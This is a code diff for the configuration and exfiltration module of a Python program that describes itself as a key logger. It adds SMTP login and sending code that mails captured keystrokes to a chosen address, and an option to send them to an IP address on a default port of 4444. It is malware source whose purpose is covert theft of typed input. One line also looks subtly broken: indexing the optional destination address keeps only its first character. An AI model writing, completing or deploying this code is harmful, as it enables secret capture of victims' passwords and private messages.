@@ -1,22 +1,76 @@
-def command_help() -> None:
-    print('Available commands:')
-    print('\t-h\t\tPrint this help')
-    print('\t--email\t\tEmail address to send the log to')
-    print('\t--addr\t\tIP address to connect to')
-    print('\t--port\t\tPort to connect to (default is 4444)')
-    print('\t--limit\t\tMaximum number of characters to send per email (default is 50)')
-    print('\t-k\t\tConsiders only keyobard inputs (by default considers all inputs)')
-    print('\t-m\t\tConsiders only mouse inputs (by default it considers all inputs)')
-    print()
-    exit(1)
-    
+import argparse, smtplib
+from re import fullmatch
+from getpass import getpass
 
-def triggerArgumentsError() -> None:
-    print('Wrong command line arguments. Check help menu.')
-    command_help()
-    exit(1)
 
-def triggerEmailError(errortype: str) -> None:
-    if errortype == 'login':
-        print('Something went wrong during authentication, verify your credentials or your internet access.')
-    exit(1)
+class ConfigEmail:
+
+    EMAIL_REGEX = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
+
+    def __init__(self, address: str, password: str, destination: str) -> None:
+        # smtp.gmail.com
+        self.server = smtplib.SMTP_SSL('smtp.sapo.pt', 465)
+        self.address = address
+        self.password = password
+        self.destination = destination
+
+    def emailLogin(self) -> None:
+        print('Logging in to email...')
+        try:
+            self.server.login(self.address, self.password)
+            print('Logged in successfully!')
+        except smtplib.SMTPAuthenticationError:
+            print('Invalid email/password or 2FA is blocking login!')
+            exit(1)
+        
+    def sendEmail(self, message: str) -> None:
+        print('Sending email...')
+        try:
+            self.server.sendmail(self.address, self.destination, message)
+            print('Email sent successfully!')
+        except smtplib.SMTPException:
+            print('Couldn\'t send email!')
+            exit(1)
+
+    @classmethod
+    def checkEmail(cls, email_address: str) -> bool:
+        return fullmatch(cls.EMAIL_REGEX, email_address)
+
+class Configs:
+
+    DEFAULT_MAX_CHARS = 50
+    DEFAULT_PORT = 4444
+
+    def __init__(self, filename: str) -> None:
+        self.email, self.ip, self.port, self.limit = None, None, None, None
+
+        parser = argparse.ArgumentParser(prog=filename, description='An Email Key Logger, developed using Python, able to send the all pressed keys to a given email address or an IP address', add_help=True)
+        subparsers = parser.add_subparsers(title='Valid Destination Addresses')
+        
+        parser_email = subparsers.add_parser('email', help='Email Address')
+        parser_email.add_argument('-f', '--from', type=str, nargs=1, required=True, help='Email Address to send from', action='store', dest='from_email')
+        parser_email.add_argument('-t', '--to', type=str, nargs='?', required=False, help='Email Address to send to (default: source email address)', action='store', dest='to_email')
+        parser_email.add_argument('-l', '--limit', type=str, nargs='?', help=f'Maximum number of characters to send per email (default: {self.DEFAULT_MAX_CHARS})', required=False, action='store', default=self.DEFAULT_MAX_CHARS)
+
+        parser_ip = subparsers.add_parser('ip', help='IP Address')
+        parser_ip.add_argument('-a', '--addr', type=str, nargs=1, required=True, help=f'IP address to connect to', action='store')
+        parser_ip.add_argument('-p', '--port', type=str, nargs='?', help=f'Port to connect to (default: {self.DEFAULT_PORT})', required=False, action='store', default=self.DEFAULT_PORT)
+        parser_ip.add_argument('-l', '--limit', type=str, nargs='?', help=f'Maximum number of characters to send per email (default: {self.DEFAULT_MAX_CHARS})', required=False, action='store', default=self.DEFAULT_MAX_CHARS)
+
+        # parser.add_argument('-k', '--keyboard', help='Considers only keyobard inputs (default: considers keyboard inputs)', required=False, action='store_true')
+        # parser.add_argument('-m', '--mouse', help='Considers only mouse inputs (default: considers all inputs)', required=False, action='store_true')
+        
+        args = parser.parse_args()
+        self.limit = args.limit
+
+        if hasattr(args, 'to_email'):
+            from_email = args.from_email[0]
+            to_email = args.to_email[0] if args.to_email else from_email
+            if not ConfigEmail.checkEmail(from_email) or not ConfigEmail.checkEmail(to_email):
+                parser.error('Invalid email address')
+            password = getpass(f'Password for {from_email}: ')
+
+            self.email = ConfigEmail(from_email, password, to_email)
+        elif hasattr(args, 'addr'):
+            self.ip = args.addr[0]
+            self.port = args.port
